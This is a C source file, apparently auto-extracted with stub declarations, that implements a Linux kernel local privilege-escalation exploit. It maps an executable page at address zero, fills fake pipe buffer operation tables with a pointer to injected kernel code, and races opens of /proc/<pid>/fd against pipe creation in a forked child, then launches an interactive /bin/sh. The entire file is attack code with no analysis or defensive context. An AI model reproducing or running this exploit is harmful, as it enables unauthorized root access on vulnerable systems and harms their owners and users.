
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct pseudo_pipe_inode_info {TYPE_1__* bufs; scalar_t__ writers; scalar_t__ readers; } ;
struct pipe_buf_operations {int** ops; } ;
struct TYPE_2__ {struct pipe_buf_operations* ops; } ;


 int MAP_ANONYMOUS ;
 int MAP_FIXED ;
 int MAP_PRIVATE ;
 int O_RDWR ;
 int PIPE_BUFFERS ;
 int PROT_EXEC ;
 int PROT_READ ;
 int PROT_WRITE ;
 int close (int) ;
 int execl (char*,char*,char*,int *) ;
 int fork () ;
 int getgid () ;
 int getpid () ;
 int getuid () ;
 int gid ;
 int is_done (int ) ;
 scalar_t__ kernel_code ;
 char* mmap (int ,int,int,int,int ,int ) ;
 int open (char*,int ) ;
 int perror (char*) ;
 int pipe (int*) ;
 int printf (char*,...) ;
 int setresgid (int ,int ,int ) ;
 int setresuid (int ,int ,int ) ;
 int sprintf (char*,char*,int) ;
 int uid ;

int main(int ac, char **av)
{
 int fd[2];
 int pid;
 int parent_pid = getpid();
 char *buf;
 int i,j;
 struct pseudo_pipe_inode_info *pinfo = 0;
 struct pipe_buf_operations ops;

 buf = mmap(0, 0x1000, PROT_READ | PROT_EXEC | PROT_WRITE, MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS, 0, 0);

 printf ("buf: %p\n", buf);

 pinfo->readers = 0;
 pinfo->writers = 0;

 for (i = 0; i < 10; i++)
  ops.ops[i] = (int *)kernel_code;

 for (i = 0; i < PIPE_BUFFERS; i++)
 {
  pinfo->bufs[i].ops = &ops;
 }

 i = 0;


 uid = getuid();
 gid = getgid();
 setresuid(uid, uid, uid);
 setresgid(gid, gid, gid);

 {
  pid = fork();
  if (pid == -1)
  {
   perror("fork");
   return (-1);
  }
  if (pid)
  {
   char path[1024];
   char c;

   sprintf(path, "/proc/%d/fd/4", pid);
          printf("Parent: %d\nChild: %d\n", parent_pid, pid);
   while (!is_done(0))
   {
    fd[0] = open(path, O_RDWR);
    if (fd[0] != -1)
    {
     close(fd[0]);
    }
   }

   execl("/bin/sh", "/bin/sh", "-i", ((void*)0));
   return (0);
  }

  while (!is_done(0))
  {
   if (pipe(fd) != -1)
   {
    close(fd[0]);
    close(fd[1]);
   }
  }
 }
}
